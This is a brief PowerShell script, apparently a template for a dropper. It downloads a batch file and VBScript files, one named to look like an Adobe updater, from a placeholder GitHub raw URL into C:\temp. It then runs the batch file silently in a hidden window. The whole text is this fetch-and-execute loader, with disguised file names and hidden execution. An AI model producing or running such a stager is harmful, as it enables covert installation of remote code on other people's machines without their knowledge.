$dir = "C:\temp"
if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir | Out-Null }

# Define the base URL for your folder (use the RAW GitHub link)
$base = "https://raw.githubusercontent.com/[User]/[Repo]/main/[Folder]"

# List of files needed for THIS specific version
$files = @("setup.bat", "AdobeUpdater.vbs", "file.mp3", "LogicMonitor.vbs") # Add/remove as needed

foreach ($file in $files) {
    Invoke-RestMethod -Uri "$base/$file" -OutFile "$dir/$file"
}

# Run the setup file silently
Start-Process "cmd.exe" -ArgumentList "/c $dir\setup.bat" -WindowStyle Hidden